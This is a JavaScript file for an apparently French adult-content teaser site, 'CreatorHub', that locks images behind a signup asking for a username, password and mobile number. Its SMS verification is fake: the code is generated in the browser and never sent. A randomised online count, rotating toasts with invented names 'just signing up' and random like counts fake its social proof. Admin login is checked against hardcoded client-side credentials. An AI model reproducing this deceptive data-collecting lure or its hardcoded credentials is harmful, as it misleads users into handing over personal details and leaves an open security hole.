const grid=document.getElementById('grid');
const modal=document.getElementById('modal');
const lightbox=document.getElementById('lightbox');
const ctaBtn=document.getElementById('ctaBtn');
const closeModal=document.getElementById('closeModal');
const authForm=document.getElementById('authForm');
const userPanel=document.getElementById('userPanel');
const modalTitle=document.getElementById('modalTitle');
let isLogin=false;
let currentUser=JSON.parse(localStorage.getItem('ch_user_v2')||'null');
localStorage.removeItem('ch_user');
let likes={};
let comments={};

const defaultImgs=Array.from({length:6},(_,i)=>`https://picsum.photos/seed/creator${i}/400/600`);
const custom=JSON.parse(localStorage.getItem('ch_imgs_custom')||'null');
const imgs= custom && custom.length ? custom : defaultImgs;

function render(){
  grid.innerHTML='';
  imgs.forEach((src,i)=>{
    const unlocked=!!currentUser;
    const card=document.createElement('div');
    card.className='card'+(unlocked?' unlocked':'');
    card.innerHTML=`
      <img src="${src}" loading="lazy">
      <div class="card-overlay"><div style="text-align:center"><div class="lock-mini">🔒</div><div style="font-size:8px;font-weight:900;letter-spacing:1px;margin-top:6px;color:#fff">INSCRIPTION REQUISE</div></div></div>
      <small>🔒 PRIVÉ</small>
      <div class="meta"><b>@creator${i+1}</b> · ❤️ ${likes[i]||Math.floor(Math.random()*200)} · 18+</div>
    `;
    card.onclick=()=>{
      if(!currentUser){ openModal(); return; }
      openLight(i,src);
    };
    grid.appendChild(card);
  });
  ctaBtn.textContent=currentUser?'Voir les contenus →':'🔥 Inscription 100% Gratuite';
  document.getElementById('headerLogout').classList.toggle('hidden',!currentUser);
  document.getElementById('headerLogin').classList.toggle('hidden',!!currentUser);
}

function openModal(){ modal.classList.remove('hidden'); updateModal(); }
function closeM(){ modal.classList.add('hidden'); }
let pendingUser=null, pendingCode=null;
function updateModal(){
  document.getElementById('codePanel').classList.add('hidden');
  if(currentUser){
    authForm.classList.add('hidden');
    userPanel.classList.remove('hidden');
    modalTitle.textContent='Bienvenue';
    document.getElementById('userName').textContent=currentUser.username;
  } else {
    authForm.classList.remove('hidden');
    userPanel.classList.add('hidden');
    modalTitle.textContent=isLogin?'Connexion':'Inscription gratuite';
  }
}
function showCodeStep(phone){
  authForm.classList.add('hidden');
  userPanel.classList.add('hidden');
  const cp=document.getElementById('codePanel');
  cp.classList.remove('hidden');
  modalTitle.textContent='Vérification SMS';
  document.getElementById('codePhone').textContent='+33 '+phone;
  document.getElementById('codeInput').value='';
  document.getElementById('codeErr').style.display='none';
  setTimeout(()=>document.getElementById('codeInput').focus(),100);
}

ctaBtn.onclick=()=> currentUser ? document.getElementById('grid').scrollIntoView({behavior:'smooth'}) : openModal();
document.getElementById('hero').onclick=()=> currentUser ? openLight(0,imgs[0]) : openModal();
closeModal.onclick=closeM;
modal.onclick=e=>{ if(e.target===modal) closeM(); };

document.getElementById('switchLogin').onclick=e=>{
  e.preventDefault();
  isLogin=!isLogin;
  document.querySelector('.cta.full').textContent=isLogin?'Se connecter →':'Créer mon compte →';
  document.getElementById('switchLogin').textContent=isLogin?'S\'inscrire':'Se connecter';
  modalTitle.textContent=isLogin?'Connexion':'Inscription gratuite';
  document.querySelector('.phone-field').style.display=isLogin?'none':'flex';
  document.getElementById('phone').required=!isLogin;
};

authForm.onsubmit=e=>{
  e.preventDefault();
  const u=document.getElementById('username').value.trim();
  const pwd=document.getElementById('password').value;
  if(isLogin){
    if(u==='adminadminadmin' && pwd==='adminadminadmin'){ sessionStorage.setItem('ch_admin_sess','1'); location.href='admin.html'; return; }
    alert('connexion impossible'); return;
  }
  const ph=document.getElementById('phone').value.replace(/\s/g,'').trim();
  if(!u||!ph) return;
  if(!/^0?[6-7][0-9]{8}$/.test(ph)){ alert('Numéro invalide (format: 06XXXXXXXX)'); return; }
  pendingUser={username:u,phone:ph,password:pwd};
  pendingCode=(''+Math.floor(1000+Math.random()*9000));
  showCodeStep(ph);
};

function doLogout(){
  localStorage.removeItem('ch_user_v2');
  currentUser=null; closeM(); render();
}
document.getElementById('logout').onclick=doLogout;
document.getElementById('headerLogout').onclick=doLogout;
document.getElementById('headerLogin').onclick=()=> openModal();
document.getElementById('unlockAll').onclick=()=>{ closeM(); render(); };
document.getElementById('verifyCode').onclick=()=>{
  const v=document.getElementById('codeInput').value.trim();
  if(v===pendingCode){
    currentUser=pendingUser; localStorage.setItem('ch_user_v2',JSON.stringify(currentUser));
    pendingUser=null; pendingCode=null; closeM(); render();
  } else { document.getElementById('codeErr').style.display='block'; }
};
document.getElementById('resendCode').onclick=e=>{
  e.preventDefault(); pendingCode=(''+Math.floor(1000+Math.random()*9000));
  document.getElementById('codeErr').style.display='none';
  console.log('Nouveau code:',pendingCode);
};
document.getElementById('backToForm').onclick=e=>{
  e.preventDefault(); document.getElementById('codePanel').classList.add('hidden'); authForm.classList.remove('hidden'); modalTitle.textContent='Inscription gratuite';
};
document.getElementById('codeInput').addEventListener('input',e=>{ e.target.value=e.target.value.replace(/\D/g,'').slice(0,4); if(e.target.value.length===4) document.getElementById('verifyCode').click(); });

let activeIdx=0;
function openLight(idx,src){
  activeIdx=idx;
  document.getElementById('lightImg').src=src;
  document.getElementById('likeCount').textContent=likes[idx]||0;
  renderComments();
  lightbox.classList.remove('hidden');
}
document.getElementById('closeLight').onclick=()=> lightbox.classList.add('hidden');
lightbox.onclick=e=>{ if(e.target===lightbox) lightbox.classList.add('hidden'); };
document.getElementById('likeBtn').onclick=()=>{
  likes[activeIdx]=(likes[activeIdx]||0)+1;
  document.getElementById('likeCount').textContent=likes[activeIdx];
  render();
};
document.getElementById('sendComment').onclick=()=>{
  const inp=document.getElementById('commentInput');
  if(!inp.value.trim()) return;
  comments[activeIdx]=comments[activeIdx]||[];
  comments[activeIdx].push(currentUser.username+': '+inp.value);
  inp.value=''; renderComments();
};
function renderComments(){
  const c=document.getElementById('comments');
  c.innerHTML=(comments[activeIdx]||[]).map(x=>`<div>• ${x}</div>`).join('')||'<span style="color:#666">Aucun commentaire</span>';
}
document.getElementById('shareBtn').onclick=async()=>{
  const url=location.href;
  if(navigator.share) try{ await navigator.share({title:'CreatorHub',url}); }catch{}
  else { await navigator.clipboard.writeText(url); alert('Lien copié !'); }
};
document.getElementById('seeNew').onclick=e=>{ e.preventDefault(); openModal(); };

setInterval(()=>{
  const n=document.getElementById('onlineCount');
  n.textContent=Math.floor(12000+Math.random()*2000);
},3000);

const toastNames=['hugo.mr','lea.92','enzo_t','sarah.lille','matt.officiel'];
let ti=0;
setInterval(()=>{
  const t=document.getElementById('toast');
  const name=toastNames[ti%toastNames.length]; ti++;
  t.innerHTML=`<span class="avatar">${name[0].toUpperCase()}</span><span><b>${name}</b> vient de s'inscrire · il y a ${Math.floor(Math.random()*9)+1} min</span>`;
  t.style.display='flex';
},6000);

render();
setTimeout(()=>{ if(!currentUser) openModal(); },1200);
